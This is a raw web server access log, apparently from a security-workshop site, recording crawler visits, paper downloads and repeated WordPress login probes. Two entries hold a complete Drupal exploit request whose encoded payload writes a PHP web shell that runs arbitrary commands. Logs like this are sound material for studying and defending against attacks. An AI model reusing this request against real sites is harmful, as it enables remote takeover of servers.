137.112.228.195 - - [01/May/2018:15:58:45 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [01/May/2018:15:58:45 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.175.151.77 - - [01/May/2018:15:58:57 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
137.175.151.77 - - [01/May/2018:15:58:57 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.142 - - [01/May/2018:15:59:21 -0400] "GET /papers/2011/nspw2011-gutmann.pdf HTTP/1.1" 200 454623 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
123.125.143.5 - - [01/May/2018:15:59:45 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 9624 "-" "Python-urllib/2.7"
123.125.143.9 - - [01/May/2018:15:59:46 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 4339 "-" "Python-urllib/2.7"
123.125.143.139 - - [01/May/2018:15:59:47 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 25021 "-" "Python-urllib/2.7"
123.125.143.142 - - [01/May/2018:15:59:48 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 5203 "-" "Python-urllib/2.7"
123.125.143.145 - - [01/May/2018:15:59:51 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 6165 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.145 - - [01/May/2018:15:59:52 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 709 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.145 - - [01/May/2018:15:59:53 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 757 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.145 - - [01/May/2018:15:59:55 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.145 - - [01/May/2018:15:59:56 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.145 - - [01/May/2018:15:59:57 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
84.139.112.1 - - [01/May/2018:16:00:08 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
84.139.112.1 - - [01/May/2018:16:00:10 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [01/May/2018:16:00:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [01/May/2018:16:00:49 -0400] "GET /robots.txt HTTP/1.1" 200 5979 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
180.76.15.139 - - [01/May/2018:16:01:21 -0400] "GET /proceedings/2008 HTTP/1.1" 200 14227 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
77.88.47.40 - - [01/May/2018:16:00:52 -0400] "GET /papers/2010/nspw2010-bishop.pdf HTTP/1.1" 200 656695 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:16:01:50 -0400] "GET /2006/index.shtml HTTP/1.1" 200 5377 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:16:01:58 -0400] "GET /papers/2013/?C=S;O=A HTTP/1.1" 200 4382 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.87 - - [01/May/2018:16:02:26 -0400] "GET /2005/papers.content HTTP/1.1" 200 6100 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.135 - - [01/May/2018:16:04:21 -0400] "GET /papers/2009/?C=N;O=A HTTP/1.1" 200 7035 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.150 - - [01/May/2018:16:05:21 -0400] "GET /2009/proceedings/1999/nspw1999-henning.pdf HTTP/1.1" 200 666903 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
69.162.124.227 - - [01/May/2018:16:05:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
35.224.63.232 - - [01/May/2018:16:06:00 -0400] "GET /papers/1993/nspw1993-meadows.pdf HTTP/1.1" 200 322200 "-" "Python/3.5 aiohttp/3.1.3"
180.76.15.22 - - [01/May/2018:16:06:21 -0400] "GET /2004/?C=N;O=D HTTP/1.1" 200 8404 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
79.118.145.178 - - [01/May/2018:16:07:45 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
79.118.145.178 - - [01/May/2018:16:07:46 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
216.244.66.200 - - [01/May/2018:16:09:32 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
69.162.124.227 - - [01/May/2018:16:10:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [01/May/2018:16:10:49 -0400] "GET /2011/local HTTP/1.1" 200 8270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [01/May/2018:16:10:53 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 4419 "https://www.nspw.org/2011/local" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [01/May/2018:16:10:53 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 4140 "https://www.nspw.org/2011/local" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:16:10:53 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 3993 "https://www.nspw.org/2011/local" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [01/May/2018:16:10:54 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "https://www.nspw.org/2011/local" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:16:10:54 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 472 "https://www.nspw.org/2011/local" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:16:10:55 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1585 "https://www.nspw.org/2011/local" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [01/May/2018:16:10:55 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2307 "https://www.nspw.org/2011/local" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [01/May/2018:16:10:56 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "https://www.nspw.org/2011/local" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:16:10:56 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 505 "https://www.nspw.org/2011/local" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:16:10:57 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1062 "https://www.nspw.org/2011/local" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
217.131.93.39 - - [01/May/2018:16:11:15 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
217.131.93.39 - - [01/May/2018:16:11:16 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
54.70.40.11 - - [01/May/2018:16:12:18 -0400] "GET /robots.txt HTTP/1.1" 200 4282 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
54.70.40.11 - - [01/May/2018:16:12:34 -0400] "GET /robots.txt HTTP/1.1" 200 4282 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
179.198.70.67 - - [01/May/2018:16:12:45 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
179.198.70.67 - - [01/May/2018:16:12:46 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
73.209.71.29 - - [01/May/2018:16:13:16 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 200 769415 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Zotero/5.0"
54.70.40.11 - - [01/May/2018:16:13:45 -0400] "GET /papers/2009/nspw2009-church.pdf HTTP/1.1" 200 283421 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
192.99.7.203 - - [01/May/2018:16:14:05 -0400] "GET / HTTP/1.1" 200 6076 "https://www.facebook.com/lasalleacm/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
54.70.40.11 - - [01/May/2018:16:14:50 -0400] "GET /2011 HTTP/1.1" 200 6702 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
54.70.40.11 - - [01/May/2018:16:15:16 -0400] "GET /2010 HTTP/1.1" 200 6721 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
69.162.124.227 - - [01/May/2018:16:15:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
54.70.40.11 - - [01/May/2018:16:15:36 -0400] "GET / HTTP/1.1" 200 6384 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
77.88.47.40 - - [01/May/2018:16:18:19 -0400] "GET /2005/proceedings.content HTTP/1.1" 200 3722 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
223.218.104.68 - - [01/May/2018:16:18:20 -0400] "GET / HTTP/1.1" 200 6623 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
66.249.73.89 - - [01/May/2018:16:19:11 -0400] "GET /2011/pc HTTP/1.1" 200 6523 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:16:20:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [01/May/2018:16:22:05 -0400] "GET /current/ HTTP/1.1" 200 6908 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.236 - - [01/May/2018:16:22:11 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
172.245.58.248 - - [01/May/2018:16:23:15 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 503699 "http://www.google.com/search?q=cibc+internet+logon&rls=com.microsoft:en-us&ie=UTF-8&oe=UTF-8&startIndex=&startPage=1" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)"
69.162.124.227 - - [01/May/2018:16:25:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
136.243.17.161 - - [01/May/2018:16:25:38 -0400] "GET /papers/2003/nspw2003-alkassar.pdf HTTP/1.1" 200 787984 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
66.249.73.87 - - [01/May/2018:16:27:33 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
73.30.153.49 - - [01/May/2018:16:29:47 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
73.30.153.49 - - [01/May/2018:16:29:47 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
157.55.39.70 - - [01/May/2018:16:29:50 -0400] "GET /papers/2009/nspw2009-misra.pdf HTTP/1.1" 200 433230 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [01/May/2018:16:30:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
199.16.157.183 - - [01/May/2018:16:31:01 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
77.88.47.40 - - [01/May/2018:16:33:49 -0400] "GET /node/21 HTTP/1.1" 200 6155 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
54.70.40.11 - - [01/May/2018:16:33:56 -0400] "GET /robots.txt HTTP/1.1" 200 4282 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
62.114.159.33 - - [01/May/2018:16:34:05 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
62.114.159.33 - - [01/May/2018:16:34:07 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [01/May/2018:16:34:10 -0400] "GET /2011/pc HTTP/1.1" 200 6553 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:16:34:24 -0400] "GET /papers/2001/nspw2001-taylor.pdf HTTP/1.1" 200 714106 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [01/May/2018:16:35:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
59.124.153.166 - - [01/May/2018:16:35:38 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6216 "-" "curl/7.47.0"
66.249.65.106 - - [01/May/2018:16:35:56 -0400] "GET / HTTP/1.1" 200 6604 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.106 - - [01/May/2018:16:35:59 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1062 "https://nspw.org/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.104 - - [01/May/2018:16:35:59 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 4979 "https://nspw.org/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.106 - - [01/May/2018:16:36:00 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 599 "https://nspw.org/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.108 - - [01/May/2018:16:36:00 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 4140 "https://nspw.org/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.104 - - [01/May/2018:16:36:01 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2307 "https://nspw.org/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.104 - - [01/May/2018:16:36:01 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 472 "https://nspw.org/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.106 - - [01/May/2018:16:36:02 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "https://nspw.org/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.106 - - [01/May/2018:16:36:02 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1025 "https://nspw.org/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.106 - - [01/May/2018:16:36:03 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 505 "https://nspw.org/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.108 - - [01/May/2018:16:36:03 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "https://nspw.org/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
107.77.237.190 - - [01/May/2018:16:36:14 -0400] "GET /wp-login.php HTTP/1.1" 404 8176 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
107.77.237.190 - - [01/May/2018:16:36:15 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
188.214.146.166 - - [01/May/2018:16:37:25 -0400] "GET /wp-login.php HTTP/1.1" 404 7903 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
188.214.146.166 - - [01/May/2018:16:37:26 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
157.55.39.70 - - [01/May/2018:16:37:22 -0400] "GET /papers/1996/nspw1996-serban.pdf HTTP/1.1" 200 511284 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
82.238.16.31 - - [01/May/2018:16:37:49 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
82.238.16.31 - - [01/May/2018:16:37:49 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [01/May/2018:16:40:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
82.67.161.19 - - [01/May/2018:16:40:54 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
82.67.161.19 - - [01/May/2018:16:40:54 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
35.224.113.158 - - [01/May/2018:16:42:46 -0400] "GET /papers/2009/nspw2009-church.pdf HTTP/1.1" 200 283620 "-" "Python/3.5 aiohttp/3.1.3"
66.249.73.87 - - [01/May/2018:16:44:19 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 712024 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:16:45:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.244.66.236 - - [01/May/2018:16:45:42 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.73.89 - - [01/May/2018:16:45:43 -0400] "GET /robots.txt HTTP/1.1" 200 4504 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [01/May/2018:16:45:22 -0400] "GET /papers/2002/nspw2002-inoue.pdf HTTP/1.1" 200 872529 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.91 - - [01/May/2018:16:47:05 -0400] "GET /current/program.shtml HTTP/1.1" 404 8016 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.255.250.67 - - [01/May/2018:16:49:24 -0400] "GET /2010/papers HTTP/1.1" 200 7324 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:16:49:57 -0400] "GET /2004/oc.shtml HTTP/1.1" 200 5624 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [01/May/2018:16:50:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [01/May/2018:16:52:40 -0400] "GET /2018 HTTP/1.1" 200 6903 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:16:55:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
109.131.111.187 - - [01/May/2018:16:58:11 -0400] "GET /wp-login.php HTTP/1.1" 404 7903 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
109.131.111.187 - - [01/May/2018:16:58:11 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
59.124.153.166 - - [01/May/2018:17:00:04 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6212 "-" "curl/7.47.0"
69.162.124.227 - - [01/May/2018:17:00:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [01/May/2018:17:01:03 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 200 666930 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [01/May/2018:17:04:42 -0400] "GET /node/73 HTTP/1.1" 200 7924 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
157.55.39.122 - - [01/May/2018:17:04:41 -0400] "GET /papers/2010/nspw2010-bishop.pdf HTTP/1.1" 200 660564 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [01/May/2018:17:05:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
158.129.23.251 - - [01/May/2018:17:06:23 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
158.129.23.251 - - [01/May/2018:17:06:23 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
81.96.83.242 - - [01/May/2018:17:08:31 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
81.96.83.242 - - [01/May/2018:17:08:32 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
216.244.66.236 - - [01/May/2018:17:09:14 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.73.91 - - [01/May/2018:17:09:26 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 200 159425 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
78.16.172.26 - - [01/May/2018:17:09:58 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
78.16.172.26 - - [01/May/2018:17:10:00 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [01/May/2018:17:10:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.244.66.236 - - [01/May/2018:17:10:44 -0400] "GET /papers/2001/nspw2001-foley.pdf HTTP/1.1" 200 722520 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
